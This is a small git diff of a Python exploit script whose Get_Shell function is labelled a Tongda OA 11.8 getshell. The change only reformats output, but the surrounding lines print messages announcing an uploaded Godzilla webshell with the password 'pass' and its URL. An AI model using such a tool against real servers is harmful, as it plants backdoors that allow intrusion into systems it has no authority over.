@@ -65,7 +65,8 @@ def Get_Shell(target_url,cookie): ## 通达11.8getshell
         if res.status_code == 200:
             # print('[*] 成功上传冰蝎shell, 密码为: rebeyond')
             print(GREEN + '[*] 成功上传哥斯拉shell, 密码为: pass' + END)
-            print(GREEN + '[*] Shell地址为: {}'.format(target_url + payload) + '\n' + END)
+            print(GREEN + '[*] Shell地址为: {}'.format(target_url + payload) + END)
+            print('')
         else:
             # print('[*]  成功上传冰蝎shell, 密码为: rebyeond')
             print(GREEN + '[*] 成功上传哥斯拉shell, 密码为: pass' + END)
